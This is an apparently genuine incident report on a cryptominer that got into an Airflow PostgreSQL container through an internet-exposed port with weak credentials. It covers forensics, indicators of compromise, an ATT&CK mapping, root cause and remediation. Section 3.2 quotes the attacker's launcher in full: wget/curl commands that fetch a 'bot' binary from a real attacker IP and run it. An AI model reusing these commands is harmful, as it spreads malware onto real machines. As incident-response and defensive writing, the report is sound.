# Security Incident Report — Airflow PostgreSQL Container Cryptominer Compromise

- **Date:** 2026-07-03
- **Severity:** High (active cryptominer with established C2)
- **Status:** Contained & remediated (container-level); host compromise **not confirmed**
- **Scope (confirmed):** `maple-airflow-db` container only
- **Scope (not confirmed):** host OS, other containers, application database
- **Author:** investigation run via Claude Code; peer-reviewed during handling

> **Reading convention.** Every claim below is tagged **FACT** (verified by a command
> output captured during the investigation) or **HYPOTHESIS** (plausible but not
> confirmed by direct evidence). Where evidence was lost, the limitation is stated.

---

## Executive Summary

- **Cause:** A cryptominer compromised the Airflow PostgreSQL metadata container
  through an internet-exposed postgres port (`5432 → 0.0.0.0` on a public-IP host)
  protected by a weak superuser password. Postgres `COPY … TO PROGRAM`
  (superuser shell execution) was abused to drop a launcher, which fetched and ran
  the miner.
- **Impact:** Confined to the Airflow metadata container (CPU theft + miner/C2
  residency). No application or customer data. Host and application database were
  inspected and **no compromise evidence was found** (with a stated caveat).
- **Recovery:** Container isolated, artifacts + hashes preserved, infected volume
  destroyed, service recreated with `127.0.0.1`-only port binding and a strong
  random password. C2 cut.
- **Lessons:** The earlier "parallel-worker leak" diagnosis was wrong; AI-generated
  infrastructure defaults (`0.0.0.0` binds, `admin`/`admin`, host networking) need a
  security-review pass; databases must never be exposed directly to the internet.

---

## 1. Summary

During pipeline bring-up, `maple-airflow-db` (the Airflow metadata PostgreSQL
container) showed sustained ~655–780% CPU.

The **first hypothesis was a PostgreSQL parallel-worker leak** (an "orphaned live
worker" theory from an earlier session). This was **disproven**: setting
`max_parallel_workers=0` had no effect on CPU.

Container forensic analysis then found three foreign binaries in `/tmp`, an
outbound dropper script, and live connections to external mining-pool endpoints.
This was a **cryptominer compromise of the airflow-db container**, almost
certainly entered through an internet-exposed PostgreSQL port with a weak
superuser password.

The host and the application database were inspected and **no compromise evidence
was found** (with the caveat that "not found by a basic check" is weaker than
"proven clean").

---

## 2. Timeline

### 2.1 Incident timeline at a glance (UTC)

| Time (UTC) | Event | Basis | Confidence |
|------------|-------|-------|------------|
| ≤ 2026-07-02 | First compromise (estimated) | prior session already observed 655–780% CPU and **misdiagnosed** it as a parallel-worker leak (PR #1454) | ESTIMATE — DB auth logs lost, exact entry unknown |
| 2026-07-02 23:42 | Parallel-disable "fix" committed (wrong diagnosis) | git `655c4fcc1` | FACT |
| 2026-07-03 00:14 | `/tmp/kunt` dropper (re-infection) | file mtime `00:14:16Z` | FACT |
| 2026-07-03 00:20–00:21 | `/tmp/postgresql` miner + `/tmp/systemd` watchdog dropped | file mtimes | FACT |
| ~2026-07-03 00:30 | 655% re-observed **despite** `max_parallel_workers=0` → forensics begun | session record | ESTIMATE (±10 min) |
| ~2026-07-03 00:5x | `docker stop` isolation → CPU→0, C2 cut | session record | FACT (time ±) |
| 2026-07-03 01:25 | Volume destroyed + `127.0.0.1` bind + strong password redeploy | container `Created 01:25:10Z` | FACT |

> **Timezone note.** The `/tmp/kunt` mtime `00:14 UTC` equals `09:14 KST`. A
> superficial "00:14 → 09:00" reading is a timezone artifact, not a 9-hour gap —
> this-session detection followed the dropper by ~16 minutes. The genuine dwell
> time came from the prior session's misdiagnosis (see MTTD below).

### 2.2 Four-phase breakdown

| Phase | Time (UTC) | Basis |
|-------|------------|-------|
| **Occurrence** (estimated) | ≤ 2026-07-02 | compromise predated this session; exact first entry unknown |
| **Detection** (correct identification) | ~2026-07-03 00:30 | 655% persisted with parallel disabled → forensics |
| **Containment** | ~2026-07-03 00:5x | container stopped, C2 severed |
| **Recovery** | 2026-07-03 01:25 | clean volume + localhost bind + strong pw |

### 2.3 Detection metrics (MTTD / MTTC / MTTR)

- **MTTD (this-session re-infection → detection):** ~16 min. Lucky — the box was
  being actively benchmarked when the dropper ran, so the CPU spike was caught
  immediately.
- **MTTD (true: first compromise → correct identification):** ~18–24 h. Dominated
  by the prior session's parallel-worker-leak misdiagnosis, which let the miner
  run for a day while the "fix" (`max_parallel_workers=0`) had no effect. **This
  is the real detection gap and the main lesson.**
- **MTTC (detection → containment):** ~30 min (forensics → `docker stop`).
- **MTTR (containment → recovery):** ~30 min (volume nuke → clean redeploy + verify).

### 2.4 Narrative

### T0 — Symptom (FACT)
- `maple-airflow-db` CPU steady at **655–780%** (`docker stats`).
- `pg_stat_activity` showed only idle Airflow queries — nothing active enough to
  explain the load.
- Initial hypothesis (carried from a prior session): **PostgreSQL parallel-worker
  leak.** → **DISPROVEN.**

### T1 — Hypothesis disproven (FACT)
- `SHOW max_parallel_workers` / `max_parallel_workers_per_gather` both returned
  `0` with `source = command line` — the parallel-disable fix (PR #1454) **was
  active**.
- CPU remained at 655% with parallel fully disabled → parallel workers cannot be
  the cause. The earlier diagnosis was wrong.

### T2 — Container forensics (FACT)
- `top -H` inside the container showed processes named `/tmp/postgresql` with
  `{libuv-worker}`-style threads, parented to a process named `systemd`.
- `/proc/<pid>/exe` symlinks **dangled** (target deleted after exec — anti-forensics).
- Artifacts in `/tmp`:
  - `/tmp/kunt` (166 B, ASCII launcher)
  - `/tmp/postgresql` (2.0 MB ELF, statically linked, **section header stripped**)
  - `/tmp/systemd` (2.7 MB ELF, Rust + tokio, **stripped**)
- Live outbound connections:
  - `→ 5.255.106.100:44999` (ESTABLISHED)
  - `→ 5.255.115.190:48996` (ESTABLISHED)

### T3 — Host integrity check (FACT)
- `/etc/cron.hourly/free` running as root was **briefly mis-flagged as malware**.
  Reading the file revealed `echo 1 > /proc/sys/vm/drop_caches` — a **legitimate**
  cache-flush cron. *(Correction logged; see §10.)*
- Host `/tmp`, `/var/tmp`, `/dev/shm`: clean of miner artifacts.
- `docker.sock`: `srw-rw---- root:docker` (proper, not world-writable).
- No root crontab; cron directories contained only standard Ubuntu entries.
- `pgrep` for miner/bot names: none.
- **Conclusion:** no host-level compromise evidence. *(Caveat in §13.)*

### T4 — Application database check (FACT)
`maple-postgres` (the operational data DB, also exposed `5432 → 0.0.0.0`):
- OS-level: no miner processes, `/tmp` empty, `/dev/shm` only legitimate PostgreSQL
  shared-memory files, **no external/C2 connections**.
- DB-level: only the `maple` bootstrap superuser (no rogue roles), **0 event
  triggers**, **0 functions** referencing `PROGRAM`/`curl`/`wget`/`/tmp`/`kunt`,
  only `pgmq` extension (legit), `shared_preload_libraries` empty.
- **Conclusion:** application database **not compromised**.

### T5 — Containment & remediation (FACT)
- Stopped airflow-db + webserver + scheduler → C2 cut (CPU → 0%).
- Preserved `/tmp/kunt`, `/tmp/postgresql`, `/tmp/systemd` + SHA256 + `strings`
  to `evidence/airflow-db-20260703/`.
- Nuked infected volume `…_airflow_db_data` (destroyed persistence).
- Hardened compose: port `5433:5432` → `127.0.0.1:5433:5432`, strong random
  `AIRFLOW_DB_PASSWORD` (no weak default), `SQL_ALCHEMY_CONN` uses it.
- Recreated clean: `/tmp` empty, CPU 0.04%, no C2, TCP auth with strong pw OK.

---

## 3. Evidence (all FACT)

### 3.1 Artifacts (preserved in `evidence/airflow-db-20260703/`)

| File | Size | SHA256 |
|------|-----:|--------|
| `kunt` | 166 B | `f16b6f7adc11c86a923766c5ba7e6d26cfe62909eae86412a088163f89fa3e5d` |
| `postgresql` | 2,017,428 B | `77d764ced0a7bcac8814aaa2a08a1d11762f3c702eb06b77b6388d3f279951a8` |
| `systemd` | 2,736,840 B | `6096e65f87f5152248ca004f17aa15821894c4e9b1fc150286b29940329e854b` |

> These hashes are submittable to VirusTotal / malware-DB lookups to confirm family.

### 3.2 Launcher (`/tmp/kunt`) — full content

```sh
cd /tmp; rm -rf bot; wget http://91.188.254.59/bot; chmod 777 bot; ./bot database1
cd /tmp; rm -rf bot; curl http://91.188.254.59/bot; chmod 777 bot; ./bot database1
```

Dual `wget`/`curl` fallback, `chmod 777`, execute with a `database1` argument
(likely a campaign/botnet identifier). `bot` then dropped `postgresql` + `systemd`
and established pool connections.

### 3.3 Binary analysis

- `postgresql`: ELF x86-64, **statically linked, no section header** → packed/stripped
  (legitimate postgres is dynamically linked *with* section headers and lives at
  `/usr/local/bin/postgres`, 11 MB). `strings` found `/dev/shm` (shared-memory
  use, common in miners); no plaintext pool/wallet (config obfuscated / fetched
  at runtime).
- `systemd`: ELF x86-64, **static-PIE, stripped**, Rust + tokio async runtime
  (`/root/.cargo/registry/.../tokio-1.48.0`). Acts as watchdog/respawner; tokio
  worker threads explain the `{libuv-worker}`-style names seen in `top -H`.

### 3.4 Network (live, at time of capture)

| Local | Foreign | State | Role (inferred) |
|-------|---------|-------|-----------------|
| 172.20.0.2:59106 | 5.255.106.100:44999 | ESTABLISHED | mining pool / C2 |
| 172.20.0.2:54592 | 5.255.115.190:48996 | ESTABLISHED | mining pool / C2 |
| (dropper) | 91.188.254.59 | HTTP fetch | payload download |

### 3.5 Privilege / exposure facts

- `airflow` role was **superuser** (`rolsuper = t`).
- Compose `ports: "5433:5432"` bound `0.0.0.0:5433` + `[::]:5433` on a host with
  **public IPs** (`APP_SERVER_IP=141.164.54.43`, `DB_SERVER_IP=158.247.218.6`).
- Airflow webserver ran in `network_mode: host` → its UI port (`8180`) bound on
  all host interfaces while running.
- The pipeline-test skill provisions an Airflow user with **`admin`/`admin`**.

---

## 4. Indicators of Compromise (IOC)

| Type | Indicator | Context |
|------|-----------|---------|
| File path | `/tmp/kunt` | launcher script (sha256 `f16b6f7a…`) |
| File path | `/tmp/postgresql` | miner binary (sha256 `77d764ce…`) |
| File path | `/tmp/systemd` | watchdog binary (sha256 `6096e65f…`) |
| IPv4 | `91.188.254.59` | dropper host (`/bot` download over HTTP) |
| Endpoint | `5.255.106.100:44999` | C2 / mining pool |
| Endpoint | `5.255.115.190:48996` | C2 / mining pool |
| Argument | `database1` | bot campaign identifier passed to `./bot` |
| Behavioral | `wget`/`curl http://…/bot; chmod 777` | dropper signature |
| Behavioral | process named `postgresql`/`systemd` under `/tmp` with dangling `/proc/<pid>/exe` | masquerade + self-delete |

---

## 5. MITRE ATT&CK Mapping

| Stage | Technique | ID | Evidence |
|-------|-----------|----|----------|
| Initial Access | Valid Accounts | T1078 | `airflow` superuser + weak/default password on exposed port |
| Initial Access | Exploit Public-Facing Application | T1190 | `COPY … TO PROGRAM` via internet-exposed postgres |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 | `/tmp/kunt` runs `/bin/sh`; `./bot database1` |
| Persistence | Create/Modify System Process | T1543 | `/tmp/systemd` (Rust/tokio watchdog) respawns the miner |
| Persistence | Boot/Logon Initialization Scripts | T1037 | `/tmp/kunt` re-drops at every container start |
| Defense Evasion | Masquerading | T1036 | binaries named `postgresql` / `systemd` to blend in |
| Defense Evasion | File Deletion (indicator removal) | T1070.004 | `/proc/<pid>/exe` dangles (binary self-deleted after exec) |
| Command & Control | Application Layer Protocol | T1071 | HTTP dropper fetch + mining protocol over the pool link |
| Command & Control | Non-Standard Port | T1571 | high ports `44999` / `48996` |
| Resource Hijacking | Resource Hijacking (cryptomining) | T1496 | ~655–780% CPU burn + established pool connections |

---

## 6. Entry-Vector Analysis

Not definitively confirmed. Ranked by likelihood with the supporting facts.

### H1 — Airflow Web UI (admin/admin) — most likely
- **FACT:** Airflow webserver used `network_mode: host`; UI port reachable on
  `0.0.0.0` while running.
- **FACT:** skill creates `admin`/`admin` (weak, well-known default).
- **HYPOTHESIS:** attacker logged into the exposed UI and abused Airflow's
  connection/variable or DAG features to reach the metadata DB / host.
- **Status:** plausible; access logs were **lost** (webserver container recreated
  before capture) → cannot confirm login records.

### H2 — Direct PostgreSQL brute/known-default on exposed 5433 — also likely
- **FACT:** `5433` exposed on public IP; `airflow` superuser; weak/default
  password.
- **HYPOTHESIS:** automated scanner hit the open postgres, authed with a weak
  password, used `COPY … TO PROGRAM` (superuser shell exec) to drop `/tmp/kunt`.
- **Status:** plausible and matches the `database1` botnet-style campaign argument
  (mass-scanner behavior). Postgres auth/connection logs were **lost** (container
  removed before capture) → cannot confirm.

### H3 — Coolify control plane — lower likelihood
- **FACT:** Coolify + coolify-proxy present (80/443/8000).
- **HYPOTHESIS:** compromise via Coolify itself. Less likely than H1/H2 because
  the concrete exposure + weak creds in H1/H2 already explain entry.
- **Status:** not ruled out; would need Coolify version/auth audit.

> **Evidence gap (honest):** the container was removed and recreated during
> remediation before the PostgreSQL auth/connection logs and Airflow gunicorn
> access logs were captured. The `/tmp` binaries were preserved, but the logs that
> would *confirm* which vector was used were not. Entry-vector attribution is
> therefore **hypothesis**, not fact.

---

## 7. Root Cause Analysis

> **Root cause = internet exposure combined with weak/default authentication.**
> Neither alone would have sufficed: a `0.0.0.0` bind with strong credentials, or
> `admin`/`admin` reachable only on `localhost`, would each have resisted this
> attack. The compromise required *both* conditions at once.

**Internet-exposed administrative services (`0.0.0.0` bind) combined with
weak/default credentials enabled unauthorized access to the Airflow environment.**

### Causal chain

`0.0.0.0` bind → reachable from the internet → weak/default account
(`admin`/`admin`, `airflow:airflow`) → attacker authenticates →
`COPY … TO PROGRAM` (superuser shell exec) → `/tmp/kunt` dropper → miner →
CPU ~700%.

### Exposure (necessary condition — not the root cause on its own)

- `5432 → 0.0.0.0` on a public-IP host; Airflow UI on host-network `0.0.0.0:8180`;
  plus many sibling services (redis, kafka, minio, grafana, app modules) bound
  the same way.
- Exposure enabled *reachability*; it did not itself grant access.

### Authentication failure (the other half of the root cause)

- Default / weak credentials: Airflow `admin`/`admin`; postgres superuser with a
  brute-forceable default password.
- Superuser privilege: `airflow` role `rolsuper = t` → `COPY … TO PROGRAM`
  became remote code execution, not merely data access.

### Contributing Factors
- **Weak / default credentials** — the pipeline-test skill provisions
  `admin`/`admin` for Airflow and the compose default postgres password was the
  brute-forceable `airflow`.
- **Host networking** — Airflow webserver/scheduler used `network_mode: host`,
  publishing the UI port on all interfaces instead of an internal bridge.
- **Broad public exposure** — many services (postgres, redis, kafka, minio,
  grafana, airflow UI, app modules) were bound `0.0.0.0` on a public IP.
- **Unreviewed AI-generated infrastructure defaults** — `0.0.0.0` binds and
  default credentials shipped without a security review pass.

### Preventive Controls (recommended)
- **Reverse proxy / VPN-only** for management UIs (Airflow, Grafana, MinIO).
- **Secrets manager + strong random credentials**; no default accounts.
- **Firewall default-deny inbound** — only `22`/`80`/`443` (+ VPN) public.
- **Least-privilege Docker networking** — databases on an internal bridge, never
  published to the host.
- **Reduce DB attack surface** — run app roles as non-superuser; disable
  `COPY … PROGRAM`-class privileges where possible.
- **Periodic exposure audit** — alert on any `0.0.0.0` bind for non-web services.

---

## 8. Impact

**Confirmed affected:**
- `maple-airflow-db` container: CPU theft, miner + C2 residency, planted `/tmp`
  artifacts. Metadata only (Airflow DAG run state) — no application data.
- Project CPU/time: the ~655% draw was earlier mis-attributed to a "parallel-worker
  leak," consuming investigation effort in the wrong direction.

**Not confirmed affected:**
- Host OS (basic check clean — §2 T3).
- Other containers (artifact scan: only airflow-db).
- Application database `maple-postgres` (verified clean — §2 T4).

**Data sensitivity (fortunate):** personal/learning project; no PII, payment, or
customer financial data. The blast radius of a confirmed data exfil would have
been low. *(This does not reduce the need for credential rotation — see §9.)*

---

## 9. Remediation

### 9.1 Applied (FACT — verified post-change)
1. Stopped airflow-db + webserver + scheduler → cut active C2.
2. Preserved artifacts + hashes + `strings` to `evidence/airflow-db-20260703/`.
3. Removed infected container + nuked `…_airflow_db_data` volume (destroyed
   persistence + any planted DB objects).
4. `docker-compose.airflow.yml` hardening:
   - `ports: "5433:5432"` → **`"127.0.0.1:5433:5432"`** (closes internet exposure;
     airflow webserver/scheduler use host-network `localhost:5433` so still reach it).
   - `POSTGRES_PASSWORD: ${AIRFLOW_DB_PASSWORD:-airflow}` → `${AIRFLOW_DB_PASSWORD:?…}`
     (no brute-forceable default; fail-fast if unset).
   - `SQL_ALCHEMY_CONN` `airflow:airflow@` → `airflow:${AIRFLOW_DB_PASSWORD}@`.
5. `AIRFLOW_DB_PASSWORD` (strong random) appended to `.env`.
6. Recreated clean; verified `/tmp` empty, CPU 0.04%, no C2, strong-pw TCP auth OK.

### 9.2 Pending (operator action required)
- **Rotate credentials** — treat anything the miner could read as leaked:
  Airflow connections/variables, `NEXON_API_KEY`, DB passwords (incl. app DB),
  SSH keys, MinIO root creds. The miner ran as the `airflow` DB superuser; if it
  ran `COPY … TO PROGRAM` it could read any file the postgres process could.
- **Close remaining public DB/service ports.** At capture time, *also* exposed on
  `0.0.0.0`: app postgres `5432`, kafka `9092`, redis `6379`, minio `9000/9001`,
  grafana `3001`, loki `3100`, app modules `8080–8084`, airflow `8180`, SSH `22`.
  Only `80`/`443` should be public; the rest must be internal-network/VPN only.
- **Airflow UI hardening:** non-default admin password + 2FA where possible; bind
  `8180` to localhost/VPN (or behind auth proxy); disable DAG upload if unused.
- **Host depth-check** (optional but recommended given superuser shell-exec risk):
  `rkhunter`/`chkrootkit`, audit `docker.sock` mounts across containers, review
  Coolify version/auth.
- **Restore firewall:** egress-block `91.188.254.59`, `5.255.106.100`,
  `5.255.115.190`; default-deny inbound except `22/80/443` (+ VPN).

---

## 10. What Was Changed Afterward

### Applied during this incident (FACT)
- Removed the infected airflow-db container and destroyed its volume (persistence
  + planted objects gone).
- Recreated airflow-db with **`127.0.0.1`-only** port binding — the internet
  exposure that enabled the breach is closed.
- Replaced the weak/default postgres password with a **strong random**
  `AIRFLOW_DB_PASSWORD`; removed the brute-forceable default from compose.
- Added `/evidence/` to `.gitignore` so forensic artifacts are never committed.
- Recorded this report (FACT/HYPOTHESIS-disciplined) for future reference and
  portfolio use.

### Planned hardening (operator follow-up — not yet done)
- Rotate all credentials that the miner could have read (API keys, DB passwords,
  SSH keys, MinIO root).
- Remove default accounts; bind management UIs to localhost/VPN; enable 2FA.
- Move all databases off public binds to an internal Docker network.
- Apply firewall default-deny + C2 egress blocks.
- Establish a recurring security checklist (exposure audit, credential rotation,
  container image scan) to prevent recurrence.

---

## 11. Mistakes & Corrections

1. **Wrong initial diagnosis (parallel-worker leak).** A prior session saw
   postgres-named processes + high CPU and concluded "parallel-worker leak,"
   shipping `max_parallel_workers=0` as the fix. With parallel fully disabled the
   CPU was still 655% → the hypothesis was impossible. **Lesson:** a binary living
   in `/tmp`, with libuv/tokio threads, masquerading as `systemd`, and dangling its
   own `/proc/<pid>/exe` is **not a postgres feature** — verify the binary path
   against the legit install location (`/usr/local/bin/postgres`) before any
   "postgres bug" hypothesis.

2. **False "host compromise" call.** Mid-investigation, `/etc/cron.hourly/free`
   running as root at 108% CPU was flagged as host malware. Reading the file
   showed `echo 1 > /proc/sys/vm/drop_caches` — a benign cache-flush cron; the CPU
   spike was the transient kernel flush, and the process had already exited. This
   was the exact **inference-without-verification** failure the reviewing operator
   flagged. **Lesson:** read the file before calling it malware.

3. **Evidence lost: DB/UI access logs.** The container was removed during
   remediation before PostgreSQL auth logs and Airflow gunicorn access logs were
   captured, so the entry vector cannot be confirmed. The `/tmp` binaries *were*
   preserved. **Lesson:** in future IR, snapshot container logs (`docker logs …
   > capture`) **before** `rm`/recreate.

---

## 12. Lessons Learned

**Technical**
- Container ≠ host — but a superuser shell-exec in a container is a serious pivot
  risk; treat container compromise as potentially host-reaching until depth-checked.
- Preserve evidence (binaries, hashes, `strings`, **logs**) *before* cleanup.
- Verify before concluding — both the "parallel leak" and the "cron malware"
  errors were inferences that a single `cat`/`file` would have corrected.

**Operational**
- Never expose databases (PostgreSQL/Redis/Kafka/MinIO) directly to the internet.
  Publish only `80`/`443`; everything else on an internal Docker network or VPN.
- AI-generated infrastructure needs a security review pass: default credentials
  (`admin`/`admin`), `0.0.0.0` port binds, and `network_mode: host` are common
  defaults that become incidents on a public-IP host.
- Least-privilege networking is the single highest-leverage control here — it
  would have prevented this incident regardless of which vector was used.

---

## 13. Confidence & Limitations

- **High confidence:** the airflow-db container was compromised by a cryptominer
  (binaries, hashes, dropper, live C2, anti-forensics markers — all directly
  observed).
- **Medium confidence:** compromise was container-bounded. Host basic checks were
  clean, but a basic check is **not** proof of absence; a determined attacker with
  transient superuser shell-exec capability could have planted deeper artifacts.
- **Low confidence:** the exact entry vector (H1 vs H2 vs H3). Requires the logs
  that were lost.
